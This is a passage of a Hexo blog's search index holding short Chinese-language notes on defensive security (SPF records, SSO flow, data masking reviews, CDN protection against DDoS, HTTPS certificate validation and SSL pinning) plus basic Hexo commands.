]]></content>
      <categories>
        <category>容器</category>
        <category>云平台</category>
      </categories>
      <tags>
        <tag>容器安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SPF防范假冒邮件</title>
    <url>/2020/01/07/spf/</url>
    <content><![CDATA[<p>如果你购买的域名，没有配置SPF值，则黑客可以冒充你的域名后缀发送邮件。</p>
<h3 id="添加TXT记录"><a href="#添加TXT记录" class="headerlink" title="添加TXT记录"></a>添加TXT记录</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">v=spf1 include:spf.mail.qq.com ip4:<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> -all</span><br></pre></td></tr></table></figure>

<h3 id="查看域名配置的TXT记录"><a href="#查看域名配置的TXT记录" class="headerlink" title="查看域名配置的TXT记录"></a>查看域名配置的TXT记录</h3><p>Windows下，命令行下输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup -<span class="built_in">type</span>=txt 域名</span><br></pre></td></tr></table></figure>

<p>Unix下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig 域名 txt +short</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>SPF</category>
      </categories>
      <tags>
        <tag>SPF</tag>
        <tag>伪造邮箱</tag>
      </tags>
  </entry>
  <entry>
    <title>keepalived</title>
    <url>/2019/11/28/keepalived/</url>
    <content><![CDATA[<p><img src="/images/keepalived.jpg" alt=""></p>
]]></content>
      <categories>
        <category>keepalived</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title>sso</title>
    <url>/2019/11/28/sso/</url>
    <content><![CDATA[<p><img src="/images/sso.png" alt=""></p>
<h3 id="鉴权-黑猫-UM（统一模板，控制子菜单权限）"><a href="#鉴权-黑猫-UM（统一模板，控制子菜单权限）" class="headerlink" title="鉴权:黑猫/UM（统一模板，控制子菜单权限）"></a>鉴权:黑猫/UM（统一模板，控制子菜单权限）</h3><h3 id="SSO-统一认证系统-单点登录"><a href="#SSO-统一认证系统-单点登录" class="headerlink" title="SSO:统一认证系统/单点登录"></a>SSO:统一认证系统/单点登录</h3><p>实现效果：访问A系统，右上角点击登录，跳转到SSO认证页面，认证通过后，返回A系统。又访问B系统，无须登录可访问B。<br><img src="/images/sso1.jpg" alt="SSO流程图"><br>8、应用A拿到user的Token，要发给SSO去校验，不校验直接返回页面给user，是不安全的。校验Token是SSO的活，因为是它生成的Token<br>9、SSO校验Token是否真实，返回True/False给应用A。应用A将用户信息存在session中，当用户下次访问应用A时，应用A检测session中是否存在，如果存在将不会再访问SSO</p>
<h3 id="AD：域账号（存储用户的账号-密码）"><a href="#AD：域账号（存储用户的账号-密码）" class="headerlink" title="AD：域账号（存储用户的账号/密码）"></a>AD：域账号（存储用户的账号/密码）</h3><p>若C系统不接SSO，直接用AD登录C系统自带的登陆页面，登录成功后，访问D系统，依然还得登录= =!</p>
]]></content>
      <categories>
        <category>sso</category>
      </categories>
      <tags>
        <tag>sso</tag>
      </tags>
  </entry>
  <entry>
    <title>数据脱敏</title>
    <url>/2019/11/26/%E8%84%B1%E6%95%8F/</url>
    <content><![CDATA[<h3 id="数据脱敏评审点"><a href="#数据脱敏评审点" class="headerlink" title="数据脱敏评审点"></a>数据脱敏评审点</h3><p>1、频率<br>2、数量级 <code>全量/抽样</code><br>3、表、字段，样例及注释<br>4、敏感信息字段是否脱敏，脱敏方式。<code>*模糊、MD5、加密等</code><br>5、最小化原则，是否必须提供</p>
]]></content>
      <categories>
        <category>安全评审</category>
      </categories>
      <tags>
        <tag>数据脱敏</tag>
      </tags>
  </entry>
  <entry>
    <title>CDN安全</title>
    <url>/2019/11/19/cdn/</url>
    <content><![CDATA[<h3 id="DDos一般D的是流量"><a href="#DDos一般D的是流量" class="headerlink" title="DDos一般D的是流量"></a>DDos一般D的是流量</h3><h3 id="CC攻击针对域名，制造大量的链接"><a href="#CC攻击针对域名，制造大量的链接" class="headerlink" title="CC攻击针对域名，制造大量的链接"></a>CC攻击针对域名，制造大量的链接</h3><p>隐藏服务器真实IP地址是最好的方法。<br>服务器前加个CDN中转，或买个高防的盾机。域名解析DNS上解析的是CDN，子网站也映射给CDN</p>
<a id="more"></a>
<blockquote>
<p>1、无论什么时候都要隐藏真实IP<br>2、购买CDN来抗DDoS不一定全程抗住，比较运营商会果断的屏蔽你的域名<br>3、DDoS是一个长久对抗的话题，尤其是应对大流量的攻击更是需要时间来磨，防守同样需要大量的资金注入，比如流量需要钱，盾机需要钱等等，主要看业务的损失来衡量需不需要投入大量的金钱去维护了。<br>4、回源是什么意思：当cdn缓存服务器没有客户端请求的资源，就会回我们的服务器上获取资源。回源地址可以是IP回源、域名回源。<br><code>客户端 ---( https)---&gt; CDN ---( https)---&gt; 源站（这个是跟随场景）</code><br><code>客户端 ---( https)---&gt; CDN ---( http)----&gt; 源站（这个是限定http）</code><br>5、CDN设置为http回源，CDN使用https就行了，不要用协议跟随（固定死CDN–&gt;源站走HTTP）。<br>6、源站域名和加速域名（用户看到的）不能一样，加速域名必须要在工信部备案，源站域名不要求备案，但需要公网能正常解析。<br>7、回源host（回源域名）是CDN请求源站时请求头中的host字段，请求源站上哪个目录web站点。可以是加速域名、源站域名、自定义URL<br>8、加速域名走https的话，需要把网站私钥给CDN服务商</p>
</blockquote>
]]></content>
      <categories>
        <category>CDN</category>
      </categories>
      <tags>
        <tag>CDN安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全体系搭建</title>
    <url>/2019/11/19/security/</url>
    <content><![CDATA[<h3 id="互联网企业"><a href="#互联网企业" class="headerlink" title="互联网企业"></a>互联网企业</h3><p>1、安全测试团队，渗透测试团队<br>2、安全应急响应（xSRC），对外宣传和白帽子漏洞处理<br>3、数据及隐私合规评审<br>4、安全研发团队，自研WAF、HIDS、内容识别、流量分析</p>
<h3 id="传统企业"><a href="#传统企业" class="headerlink" title="传统企业"></a>传统企业</h3><p>1、办公安全，堆设备，买买买！！如Macfee防病毒、深信服VPN、齐志、深信服上网行为管理、Imperva、IPS、Repid7、splunk<br>2、安全制度制定，安全证书认证，等保2.0，27001，CSTAR<br>3、安全顾问、评审、安全测试、开墙审批<br>4、安全研发，SIEM日志收集，态势感知攻击WEB，Wazuh适配，云上产品研发，SOAR安全事件响应</p>
]]></content>
      <categories>
        <category>体系</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPS证书及中间人攻击</title>
    <url>/2019/11/17/https/</url>
    <content><![CDATA[<h3 id="HTTPS原理"><a href="#HTTPS原理" class="headerlink" title="HTTPS原理"></a>HTTPS原理</h3><ul>
<li><a href="https://dabaotthao.com/2018/07/13/https/" title="dabao&#39;s Blog">浅谈https基本原理</a></li>
<li><a href="https://www.cnblogs.com/handsomeBoys/p/6556336.html" title="handsomeBoys">CA证书扫盲，https讲解</a></li>
<li><a href="https://www.2cto.com/article/201607/523509.html" title="2016.06-白泽安全团队投稿的作品">浅析HTTPS中间人攻击与证书校验</a></li>
<li><a href="https://dishibolei.github.io/2017/05/11/https-safe-1/" title="萝卜的空间">IOS应用安全-HTTP/HTTPS网络安全</a></li>
</ul>
<p><img src="/images/diagrammatize_https_theory.jpg" alt="HTTPS原理"></p>
<h3 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h3><p>1、证书=Server公钥+申请者与颁发者信息+签名<br>（<strong><code>CA的公钥</code></strong>公之于众，如浏览器内置，没有在证书中）<a id="more"></a></p>
<p>2、通过Internet直接传递Server公钥，不安全，易被中间人攻击，故引入有公信力的第三方CA，盖个戳</p>
<p>3、服务端自己生成.csr<strong>证书请求文件</strong>和.key私钥，<strong><code>公钥</code></strong>可写死在客户端，也可公网从服务端获取证书（公钥）。</p>
<p>4、申请证书不需要提供私钥，提交CSR（包含了公钥和标识名称）,确保私钥永远只能服务器掌握。</p>
<p>5、一个证书可以签发多个域名、泛域名，多个域名共用一个公私钥对</p>
<h3 id="单向认证"><a href="#单向认证" class="headerlink" title="单向认证"></a>单向认证</h3><p>1、源端不做限制，对服务端进行验证，非公司内客户端都可以访问服务端。</p>
<p>2、忽略校验证书，则服务端不可信，有风险。所有不可信的服务端都能访问，易受中间人攻击。</p>
<p>3、严格意义上来说https下不存在中间人攻击，存在中间人攻击的前提条件是没有严格的对证书进行校验，或者人为的信任伪造证书</p>
<p>4、自签的证书，客户端访问时，证书校验error，要么忽略校验，风险见上。要么使用自己定义的信任存储（trust store）代替APP系统自带的，即写死证书/公钥，见6</p>
<p>5、市场上很多APP未做好证书校验，有的只做了部分校验，例如检查证书域名是否匹配证书、是否过期；更多的根本不做校验，于是造成了中间人攻击。此类校验虽然在导入Burp证书到客户端后造成中间人攻击，但攻击门槛已相对较高，对安全要求不是特别高的APP可采用此方法进行防御。</p>
<p>6、为了防止中间人攻击，可以使用SSL-Pinning的技术来反抓包。客户端将预置的证书与从公网接收的证书做比较，如果一致，就建立连接，不走系统的证书信任链去校验，所以即使导入Burp CA公钥证书，也无法进行中间人攻击（抓包）。但相应的成本也会升高，见7</p>
<p>7、如果服务器申请的<strong>证书到期</strong>(常见)或者因为泄露等其他原因需要<strong>更换</strong>证书，但这个证书又写死在客户端APP代码中，也就必须强制用户进行客户端升级。对安全有较高要求的app（如<code>金融</code>）用这种。</p>
<p>8、SSL-pinning有两种方式：证书锁定和公钥锁定。</p>
<ul>
<li><strong>证书锁定</strong> （Certificate Pinning）</li>
<li><strong>公钥锁定</strong> （Public Key Pinning，推荐）</li>
</ul>
<p>9、为避免强升的问题，针对6优化。<br>方案一:推荐公钥锁定，公钥在证书的续期前后都可以保持不变（即密钥对不变）<br>方案二:动态更新证书。Server生成一对RSA公私钥对，公钥硬编码在APP（<strong>证书公钥不用硬编码</strong>），私钥放服务器，APP启动的时候，证书信息通过私钥签名发送给客户端，APP用预置的公钥验签，得到证书信息埋入APP设置为锚点。发起https连接获取证书，对比两个证书是否一致进行校验。但效率降低了。</p>
<p>10、抓包只能抓单向认证的</p>
<h3 id="双向认证"><a href="#双向认证" class="headerlink" title="双向认证"></a>双向认证</h3><p>校验客户端的身份，非授权客户端无法访问指定的服务端</p>
<h3 id="加密协议"><a href="#加密协议" class="headerlink" title="加密协议"></a>加密协议</h3><p>等保要求，加密协议用<strong><code>TLS 1.1</code></strong>及以上版本，推荐<strong><code>TLS 1.2</code></strong><br>禁止使用<strong><code>TLS1.0</code></strong>、<strong><code>SSL2.0</code></strong>及<strong><code>SSL3.0</code></strong></p>
]]></content>
      <categories>
        <category>HTTPS</category>
      </categories>
      <tags>
        <tag>传输加密</tag>
        <tag>SSL证书</tag>
        <tag>HTTPS原理</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo命令</title>
    <url>/2019/11/17/hexo/</url>
    <content><![CDATA[<h3 id="hexo常见操作"><a href="#hexo常见操作" class="headerlink" title="hexo常见操作"></a>hexo常见操作</h3><p><code>hexo new &quot;postName&quot;</code>#新建文章<br><code>hexo new page &quot;pageName&quot;</code>#新建页面<a id="more"></a><br><code>hexo clean</code> #清除部署緩存<br><code>hexo n == hexo new</code> #新建文章<br><code>hexo g == hexo generate</code> #生成静态页面至public目录<br><code>hexo s == hexo server</code> #开启预览访问端口（默认端口4000，可在浏览器输入localhost:4000预览）<br><code>hexo d == hexo deploy</code> #将.deploy目录部署到GitHub<br><code>hexo g -d</code> #生成加部署<br><code>hexo g -s</code>#生成加预览</p>
<h3 id="新建文章，默认的注释内容"><a href="#新建文章，默认的注释内容" class="headerlink" title="新建文章，默认的注释内容"></a>新建文章，默认的注释内容</h3><p>hexo/scaffolds/post.md</p>
<h3 id="用户自定义样式"><a href="#用户自定义样式" class="headerlink" title="用户自定义样式"></a>用户自定义样式</h3><p>hexo/themes/next/source/css/_custom/custom.styl</p>
<h3 id="文章信封区域宽度调整"><a href="#文章信封区域宽度调整" class="headerlink" title="文章信封区域宽度调整"></a>文章信封区域宽度调整</h3><p>source/css/_variables/custom.styl</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo命令及安装</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/11/11/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><a id="more"></a>
<h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
</search>
